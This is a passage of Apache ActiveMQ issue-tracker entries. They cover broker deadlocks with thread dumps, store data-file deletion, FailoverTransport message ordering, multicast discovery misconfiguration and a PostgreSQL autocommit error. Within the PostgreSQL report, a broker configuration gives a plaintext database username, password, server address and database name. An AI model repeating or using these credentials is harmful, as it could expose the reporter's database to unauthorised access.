org.apache.activemq.transport.InactivityMonitor$1@10e2558org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:183)org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:170)java.lang.Thread.run(Thread.java:619)
issueID:AMQ-1468
type:Bug
changed files:InactivityMonitor.java
texts:Deadlock between ActiveMQTransport and ActiveMQScheduler
The ActiveMQTransport thread waits on InactivityMonitor and the ActiveMQScheduler waits on ManagedTransportConnection and each thread owns the monitor on the other. Here are the details against svn rev # 585186----------------------------------------------------------------------------------------------------------------------------------------------Name: ActiveMQ SchedulerState: BLOCKED on org.apache.activemq.broker.jmx.ManagedTransportConnection@1578fa owned by: ActiveMQ Transport: tcp:///167.235.7.27:4470Total blocked: 8  Total waited: 1,931Stack trace: org.apache.activemq.broker.TransportConnection.stop(TransportConnection.java:865)org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:40)org.apache.activemq.broker.TransportConnection.serviceTransportException(TransportConnection.java:206)org.apache.activemq.broker.TransportConnection$1.onException(TransportConnection.java:185)org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:98)org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:98)org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:143)org.apache.activemq.transport.InactivityMonitor.onException(InactivityMonitor.java:155)org.apache.activemq.transport.InactivityMonitor.writeCheck(InactivityMonitor.java:81)   - locked org.apache.activemq.transport.InactivityMonitor$2@d7122borg.apache.activemq.transport.InactivityMonitor$2.run(InactivityMonitor.java:56)org.apache.activemq.thread.Scheduler$SchedulerTimerTask.run(Scheduler.java:36)java.util.TimerThread.mainLoop(Timer.java:512)java.util.TimerThread.run(Timer.java:462)--------------------------------------------------------------------------------------------------------------------------------------------------Name: ActiveMQ Transport: tcp:///167.235.7.27:4470State: BLOCKED on org.apache.activemq.transport.InactivityMonitor$2@d7122b owned by: ActiveMQ SchedulerTotal blocked: 1  Total waited: 2Stack trace: org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:135)org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:82)org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:91)org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)   - locked java.lang.Object@1738e80org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1147)org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:766)org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:727)org.apache.activemq.broker.region.PrefetchSubscription.dispatch(PrefetchSubscription.java:459)   - locked org.apache.activemq.broker.region.QueueSubscription@ddca7aorg.apache.activemq.broker.region.QueueSubscription.dispatch(QueueSubscription.java:166)org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:123)   - locked org.apache.activemq.broker.region.QueueSubscription@ddca7aorg.apache.activemq.broker.region.Queue.addSubscription(Queue.java:252)   - locked java.util.LinkedList@f1e312   - locked org.apache.activemq.broker.region.Queue@1c20eb2org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:262)   - locked java.lang.Object@72b85borg.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:335)org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:79)org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:525)   - locked org.apache.activemq.broker.jmx.ManagedTransportConnection@1578faorg.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:334)org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:281)org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:134)org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:124)   - locked org.apache.activemq.transport.InactivityMonitor$1@1e9f5b1org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:183)org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:170)java.lang.Thread.run(Thread.java:619)
issueID:AMQ-1469
type:Improvement
changed files:
texts:Change the Default Local Process Name to Something More Descriptive Than "run.jar"
The JMX console (jconsole) reports that ActiveMQ"s management bean is simply "run.jar"; whilst ActiveMQ functions perfectly with such a name, I believe a more descriptive, default name would be something that at least hinted at what "run.jar" actually is.
issueID:AMQ-1473
type:Bug
changed files:jndi.properties
log4j-jms.properties
build.xml
Log4jJMSAppenderExample.java
texts:javax.jms.JMSException: Wire format negociation timeout: peer did not send his wire format.
Periodically my JMS Client crashes and then can"t start back up. I get the following exception:javax.jms.JMSException: Wire format negociation timeout: peer did not send his wire format. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:58) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1185) at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1263) at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:449)
issueID:AMQ-1475
type:Bug
changed files:Usage.java
texts:deadlock in Usage & Topic
Found one Java-level deadlock:============================="ActiveMQ Task":  waiting to lock monitor 0x081615fc (object 0xa3ba9c38, a java.util.LinkedList),  which is held by "ActiveMQ Transport: tcp:///192.168.1.119:40586""ActiveMQ Transport: tcp:///192.168.1.119:40586":  waiting to lock monitor 0x08161598 (object 0xa3badb80, a java.lang.Object),  which is held by "ActiveMQ Task"Java stack information for the threads listed above:==================================================="ActiveMQ Task":        at org.apache.activemq.broker.region.Topic$1.run(Topic.java:94) waiting to lock <0xa3ba9c38> (a java.util.LinkedList)        at org.apache.activemq.usage.Usage.fireEvent(Usage.java:255) locked <0xa3badb80> (a java.lang.Object)        at org.apache.activemq.usage.Usage.setPercentUsage(Usage.java:232) locked <0xa3badb80> (a java.lang.Object)        at org.apache.activemq.usage.MemoryUsage.decreaseUsage(MemoryUsage.java:149)        at org.apache.activemq.command.Message.decrementReferenceCount(Message.java:602) locked <0xa73f5628> (a org.apache.activemq.command.ActiveMQObjectMessage)        at org.apache.activemq.broker.region.TopicSubscription$2.run(TopicSubscription.java:422)        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:773)        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:801)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:118)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:42)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)        at java.lang.Thread.run(Thread.java:619)"ActiveMQ Transport: tcp:///192.168.1.119:40586":        at org.apache.activemq.usage.Usage.notifyCallbackWhenNotFull(Usage.java:354) waiting to lock <0xa3badb80> (a java.lang.Object)        at org.apache.activemq.broker.region.Topic.send(Topic.java:346) locked <0xa3ba9c38> (a java.util.LinkedList)        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:328)        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:402)        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:125)        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:434)        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:623)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:281)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:134)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:126) locked <0xa5d116e8> (a org.apache.activemq.transport.InactivityMonitor$1)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:183)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:170)        at java.lang.Thread.run(Thread.java:619)using snapshot apache-activemq-5.0-20071022.150246-30java 1.6.0_01 on linux
issueID:AMQ-1477
type:Improvement
changed files:RendezvousDiscoveryAgent.java
TransportConnector.java
DiscoveryAgent.java
MulticastDiscoveryAgent.java
SimpleDiscoveryAgentFactory.java
DiscoveryNetworkConnector.java
SimpleDiscoveryAgent.java
texts:Simplify the DiscoveryAgent interface
The DiscoveryAgent interface is a little leaky.  It defines setters and getters for the brokerName and group fields but that kind of info is not always needed by a discovery agent.  Those methods should get removed for the interface.
issueID:AMQ-1479
type:Bug
changed files:
texts:AMQ Store deletes data files which are in use
The AMQ Store allocates entries in the data logs for commands (including messages/acknowledgements/transaction boundaries etc) - but relies on the reference store for keeping track of data files that are being used. Updates to the reference store happen at a checkpoint() - asynchronously. The problem is that for a fast producer, the current data file (one being written to) can move on past the last known data file to the reference store. As the cleanup() task is a scheduled task - and not coupled to check points - the cleanup task can remove data files that the reference store is not yet aware of AND have are previous to the current data file being written too. This issue can result in errors from the AMQ Store such as:Message: java.io.IOException: Failed to read to journal for: offset = 2374, file = 1, size = -1, type = 0. Reason: java.io.IOException: Could not locate data file data--1 see: http://www.nabble.com/Please-help-check-ActiveMQ-5.0.0-RC2-tf4692126s2354.htmlTest case: org.apache.activemq.bugs.DurableConsumerTest
issueID:AMQ-1485
type:New Feature
changed files:HashIndex.java
texts:Enable setting properties for sizing indexes used by the default reference store for AMQStore
None
issueID:AMQ-1486
type:New Feature
changed files:AsyncDataManager.java
DataFile.java
AMQPersistenceAdapter.java
texts:Allow message logs for AMQStore to ve archived instead of deleted when they are discarded
None
issueID:AMQ-1487
type:Bug
changed files:ActiveMQSession.java
texts:Bug in ActiveMQSession::send() prevents non-persistent messages from being sent sync
I have not tested this issue against any version other than 4.0.2.ActiveMQSession::send() contains the following code:        if(Unable to render embedded object: File (msg.isPersistent() ) not found.=null) {            this.connection.asyncSendPacket(msg);        } else {            this.connection.syncSendPacket(msg);        }This predicate short-circuits if the message is non-persistent and sends the message async even if the message is marked with "Response Required".Modified the predicate to:        if(!msg.isResponseRequired() && (!msg.isPersistent() || connection.isUseAsyncSend() || txid!=null)) {            this.connection.asyncSendPacket(msg);        } else {            this.connection.syncSendPacket(msg);        }This local patch resolved my issue.
issueID:AMQ-1488
type:Bug
changed files:FailoverTransport.java
texts:Bug in FailoverTransport results in messages that have been queued during a network interruption being sent out of order upon call to restoreTransport()
FailoverTransport stores all queued messages during network interruptions in a HashMap.  When restoreTransport() is called, the map is traversed sending each queued message.However, because the messages are stored in a HashMap, the map is traversed in hash-order - not message id order.Problematic code in FailoverTransport::restoreTransport():        for (Iterator iter2 = requestMap.values().iterator(); iter2.hasNext() {            Command command = (Command) iter2.next();            t.oneway(command);        }The following local patch resolves the issue:        // Convert the request map to a treemap.  It"s keyed off of the commandid and by putting it into a treemap, we"ll pull them off in commandid order.                TreeMap treeMap = new TreeMap();        treeMap.putAll(requestMap);        for (Iterator iter2 = treeMap.values().iterator(); iter2.hasNext() {//        for (Iterator iter2 = requestMap.values().iterator(); iter2.hasNext() {            Command command = (Command) iter2.next();            t.oneway(command);        }
issueID:AMQ-1489
type:Bug
changed files:MulticastDiscoveryAgentFactory.java
texts:discoveryUri in transportConnector and uri in networkConnector partially ignored if multicast
This bug relates to the MulticastDiscoveryAgent and was discovered when 1. the discoveryUri of a transportConnector is a multicast-uri such as<transportConnector uri="..." discoveryUri="multicast://239.3.7.0:37000" />or2. the uri of a networkConnector is a multicast-uri such as<networkConnector name="..." uri="multicast://239.3.7.0:37000">In these cases, the uri is partially ignored by the MulticastDiscoveryAgent: the host-name of the uri (239.3.7.0) is extracted and used as the group name by the MulticastDiscoveryAgent. But the actual multicast group IP is always 239.255.2.3 and the multicast port is always 6155, regardless of what the actual uri is in the configuration.The reason for this is that MulticastDiscoveryAgentFactory creates a new MulticastDiscoveryAgent and sets the group based on the uri"s host, but fails to set the discoveryURI itself. MulticastDiscoveryAgentFactory should be corrected to do this:MulticastDiscoveryAgent rc = new MulticastDiscoveryAgent();rc.setDiscoveryURI(uri); // missingrc.setGroup(uri.getHost());Without the above setting of the discoveryURI the MulticastDiscoveryAgent always uses the DEFAULT_DISCOVERY_URI_STRING which is "multicast://239.255.2.3:6155", explaining the erroneous behaviour described above.  kind regards,  geraldhttp://www.gerald-loeffler.net
issueID:AMQ-1490
type:Bug
changed files:KahaTopicReferenceStore.java
KahaReferenceStoreAdapter.java
KahaTopicMessageStore.java
pom.xml
DurableTopicSubscription.java
BrokerService.java
Topic.java
TopicSubContainer.java
MapContainerImpl.java
KahaStore.java
IOHelper.java
Store.java
PrefetchSubscription.java
texts:Deadlocks (with JUnit tests)
For some time now there have been various bug reports about ActiveMQ "blocking", "not receiving messages", "running into a deadlock" etc. Since I encoutered such deadlocks now and then, too, I eventually wrote up a JUnit testing scenario for this stuff. I found out that deadlocks can be quite easily reproduced. The symptoms are that the producer thread is sending or committing while the consumer thread is receiving or committing - and none of them can advance. One of the threads is always stuck in a blocking queue.Here"s a sample output of my testing class: An ActiveMQ deadlock has been discovered. The following threads seem to be involved: Thread "producer" is inactive since 16 seconds after 358719 status changes. The current status is COMMITTING sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)  java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1889) java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:317) org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40) org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:76) org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1172) org.apache.activemq.TransactionContext.commit(TransactionContext.java:259) org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:494) de.rainer_klute.activemq.ProducerThread.run(ProducerThread.java:162) Thread "consumer" is inactive since 16 seconds after 1807 status changes. The current status is RECEIVING java.lang.Object.wait(Native Method) java.lang.Object.wait(Object.java:485) org.apache.activemq.MessageDispatchChannel.dequeue(MessageDispatchChannel.java:75) org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:404) org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:452) org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:504) de.rainer_klute.activemq.ConsumerThread.run(ConsumerThread.java:183)The following factors seem to increase the probability of a deadlock: small values for memoryUsage working transacted in the consumer (not always necessary but "helps") many messages in the persistence store (to be achieved via a long delay before the consumer starts to read messages)
issueID:AMQ-1491
type:Bug
changed files:TcpTransport.java
texts:bug in TcpTransport.run() and stop() holds dead connections and prevents reconnects
TcpTransport.stop() await()s on a countDownLatch that is counted down in TcpTransport.run(). When stop() is called in in the dynamic scope of run(), the countDown() will never happen. Example stack:"ActiveMQ Transport: tcp://localhost/127.0.0.1:62002" prio=10 tid=0x0be46c00 nid=0x2dbc waiting on condition &#91;0x0125c000..0x0125ce50&#93;   java.lang.Thread.State: WAITING (parking)        at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x7f352dd0> (a java.util.concurrent.CountDownLatch$Sync)        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:712)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:870)        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1182)        at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:207)        at org.apache.activemq.transport.tcp.TcpTransport.stop(TcpTransport.java:440)        at org.apache.activemq.transport.InactivityMonitor.stop(InactivityMonitor.java:66)        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:63)        at org.apache.activemq.transport.WireFormatNegotiator.stop(WireFormatNegotiator.java:78)        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:63)        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:63)        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)        at org.apache.activemq.network.DemandForwardingBridgeSupport.stop(DemandForwardingBridgeSupport.java:340)        at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:40)        at org.apache.activemq.network.DiscoveryNetworkConnector.onServiceRemove(DiscoveryNetworkConnector.java:132)        at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent.serviceFailed(SimpleDiscoveryAgent.java:104)        at org.apache.activemq.network.DiscoveryNetworkConnector$1.bridgeFailed(DiscoveryNetworkConnector.java:179)        at org.apache.activemq.network.DemandForwardingBridgeSupport.fireBridgeFailed(DemandForwardingBridgeSupport.java:909)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteException(DemandForwardingBridgeSupport.java:371)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:395)        at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:149)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:100)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:134)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:126) locked <0x7f3530b0> (a org.apache.activemq.transport.InactivityMonitor$1)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:183)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:170)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-1492
type:Improvement
changed files:TransactionContext.java
JDBCPersistenceAdapter.java
texts:SET AUTOCOMMIT TO OFF is no longer supported Postgre8.1 Error
I am using Postgresql 8.1 with postgresql-8.1-409.jdbc3.jar driver for starting the broker.<persistenceAdapter>      <journaledJDBC journalLogFiles="5" dataDirectory="../persistencedata" dataSource="#postgres-ds"/>    </persistenceAdapter>  <bean id="postgres-ds" class="org.postgresql.ds.PGPoolingDataSource">    <property name="serverName" value="1.1.1.180"/>    <property name="databaseName" value="merge_emr_billing"/>    <property name="portNumber" value="5432"/>    <property name="user" value="pcare"/>    <property name="password" value="pcare007"/>    <property name="dataSourceName" value="postgres"/>    <property name="initialConnections" value="1"/>    <property name="maxConnections" value="10"/>  </bean>When i start the broker using the above configuration the following error is occured.Nov 17, 2007 2:21:27 PM org.apache.activemq.store.jdbc.JDBCPersistenceAdapter createAdapterINFO: Database driver recognized: &#91;postgresql_native_driver&#93;Exception in thread "main" java.io.IOException: ERROR:  SET AUTOCOMMIT TO OFF is no longer supported at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:43) at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:62) at org.apache.activemq.store.jdbc.TransactionContext.begin(TransactionContext.java:147) at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:156) at com.glenwood.Queue.StartBroker.createPersistenceAdapter(StartBroker.java:49) at com.glenwood.Queue.StartBroker.main(StartBroker.java:28)Caused by: java.sql.SQLException: ERROR:  SET AUTOCOMMIT TO OFF is no longer supported at org.postgresql.core.QueryExecutor.execute(QueryExecutor.java:131) at org.postgresql.jdbc1.AbstractJdbc1Connection.ExecSQL(AbstractJdbc1Connection.java:482) at org.postgresql.jdbc1.AbstractJdbc1Connection.ExecSQL(AbstractJdbc1Connection.java:461) at org.postgresql.jdbc1.AbstractJdbc1Connection.setAutoCommit(AbstractJdbc1Connection.java:953) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.postgresql.ds.common.PooledConnectionImpl$ConnectionHandler.invoke(PooledConnectionImpl.java:360) at $Proxy0.setAutoCommit(Unknown Source) at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58) ... 4 moreHow to setAutocommit to off?.. Postgre sql doesnot supporting it.
issueID:AMQ-1493
type:Improvement
changed files:
texts:Upgrade XStream to 1.2.2
The provided patch changes the version of XStream from 1.1.2 to 1.2.2 and changes the groupId property from xstream to com.thoughtworks.xstream in appropriate poms (since it has been relocated).
issueID:AMQ-1494
type:Improvement
changed files:
texts:XStreamMessageTransformer and custom HierarchicalStreamDriver
Add streamDriver property to the XStreamMessageTransformer which will be used to create appropriate readers and writers if set. The test case provided is the derivate from adaptive transformer test but uses Jettison driver to serialize to/from JSON (hence the dependency to Jettison in "test" scope).
issueID:AMQ-1498
type:Bug
changed files:
texts:Broker doens&#39;t start anymore!
Killing ActiveMQ-Broker and trying to restart it I got the following exception:java.io.IOException: Recovery Failed: The subscription does not exist: ID:Dev-AG-1992-1195220522906-3:2:-1:2        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27)        at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:110)        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:153)        at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:153)        at org.apache.activemq.broker.MutableBrokerFilter.start(MutableBrokerFilter.java:163)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:422)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:46)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1201)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1171)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:425)        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:251)        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:156)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:248)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:160)        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:287)        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:352)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:91)        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:51)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:112)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:51)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:104)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:51)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:76)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.activemq.console.Main.runTaskClass(Main.java:222)        at org.apache.activemq.console.Main.main(Main.java:106)Caused by: java.lang.IllegalArgumentException: The subscription does not exist: ID:Dev-AG-1992-1195220522906-3:2:-1:2        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:336)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:427)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)        at org.apache.activemq.broker.TransactionBroker$1.recover(TransactionBroker.java:100)        at org.apache.activemq.store.amq.AMQTransactionStore.recover(AMQTransactionStore.java:196)        at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:92)        ... 32 more2007-11-16 14:50:53,047 &#91;MQ ShutdownHook&#93; INFO  BrokerService                  - ActiveMQ Message Broker (localhost, null) is shutting down2007-11-16 14:50:53,047 &#91;MQ ShutdownHook&#93; INFO  TransportConnector             - Connector openwire Stopped2007-11-16 14:50:54,329 &#91;MQ ShutdownHook&#93; ERROR AMQPersistenceAdapter          - Could not stop service: AMQPersistenceAdapter(C:ESBActiveMQ5.0Active_Brokerin..datalocalhost). Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException        at org.apache.activemq.store.amq.AMQTxOperation.writeExternal(AMQTxOperation.java:113)        at org.apache.activemq.store.kahadaptor.AMQTxMarshaller.writePayload(AMQTxMarshaller.java:60)        at org.apache.activemq.store.kahadaptor.AMQTxMarshaller.writePayload(AMQTxMarshaller.java:34)        at org.apache.activemq.kaha.impl.data.SyncDataFileWriter.storeItem(SyncDataFileWriter.java:58)        at org.apache.activemq.kaha.impl.data.DataManagerImpl.storeDataItem(DataManagerImpl.java:151)        at org.apache.activemq.kaha.impl.container.MapContainerImpl.write(MapContainerImpl.java:516)        at org.apache.activemq.kaha.impl.container.MapContainerImpl.put(MapContainerImpl.java:301)        at org.apache.activemq.store.kahadaptor.KahaReferenceStoreAdapter.savePreparedState(KahaReferenceStoreAdapter.java:270)        at org.apache.activemq.store.amq.AMQPersistenceAdapter.stop(AMQPersistenceAdapter.java:263)        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:457)        at org.apache.activemq.broker.BrokerService.containerShutdown(BrokerService.java:1586)with the result that the Broker don"t starts anymore (Trying it 3 times).
issueID:AMQ-1499
type:Improvement
changed files:
texts:OXMMessageTransformer
I"ve created a message transformer that uses Spring OXM as a wrapping layer for different marshallers. I"ve used the current XStreamMessageTransformer as a base for this work. All classes are put in a separate "oxm" package, so I"m sending it as a zip archive.There three interesting classes here.:The first one is the AbstractXMLMessageTransformer which encapsulates all operations (such as transformation type: xml, object, adaptive) except marshalling itself (which is left abstract).OXMMessageTransformer is then easily created by extending this class. I"ve also implemented new XStreamMessageTransformer on these principles, but I"ve put it in the "oxm" package since I didn"t want to mess the current one. Basically, with this new one, the whole "xstream" package is obsolete now.I"ve also refactored test cases, so it is easy now to use the same tests with different transformers/marshallers. This will ease the task of creating additional transformers (Castor, Jaxb, ...) if someone would like to use them without OXM for any reason.
issueID:AMQ-1500
type:Bug
changed files:KahaTopicReferenceStore.java
KahaReferenceStoreAdapter.java
AsyncDataManager.java
DataFile.java
texts:Recoverying the Kaha ReferenceStore can delete subscriber state
Whe a broker isn"t shutdown cleanly - upon a re-start the broker will recover its store from its journal. Part of the process involves recoverying durable topic subscribers from the reference store. Currently - these are being deleted when the reference store is purged as part of the recovery process
issueID:AMQ-1502
type:Bug
changed files:
texts:DiskIndexLinkedList incorrectly updates references when IndexItems are removed
http://www.nabble.com/Bug-in-DiskIndexLinkedList.java-tf4873351s2354.html#a13944775
issueID:AMQ-1506
type:Improvement
changed files:ServerSessionPoolImpl.java
texts:System.out in source code: org.apache.activemq.ra.ServerSessionPoolImpl
Line 192 of org/apache/activemq/ra/ServerSessionPoolImpl.java prints to System.out:   System.out.println("ACtive Sessions = " + activeSessions.size());Perhaps this should be removed or changed to a log call.
issueID:AMQ-1507
type:Bug
changed files:
texts:Shared Filesystem Master Slave not working
I"m testing out Shared Filesystem Master Slave on a 5.0 snapshot (5.0-20071120.092745-1).However it does not seem to be working.I start two brokers with different ports but same shared data directory on a Windows host.First broker starts up nicely, second broker does not sit in a loop, trying to grab the lock every 10 seconds , but stops right away with the following trace:29-nov-2007 10:33:21 org.apache.activemq.broker.BrokerService getBrokerINFO: For help or more information please see: http://activemq.apache.org/29-nov-2007 10:33:21 org.apache.activemq.store.amq.AMQPersistenceAdapter startINFO: AMQStore starting using directory: activemq-dataEDAjava.io.IOException: Control file "activemq-dataEDAjournaldata-control" could not be locked.        at org.apache.activemq.kaha.impl.async.ControlFile.lock(ControlFile.java:77)        at org.apache.activemq.kaha.impl.async.AsyncDataManager.start(AsyncDataManager.java:116)        at org.apache.activemq.store.amq.AMQPersistenceAdapter.start(AMQPersistenceAdapter.java:172)        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1448)        at 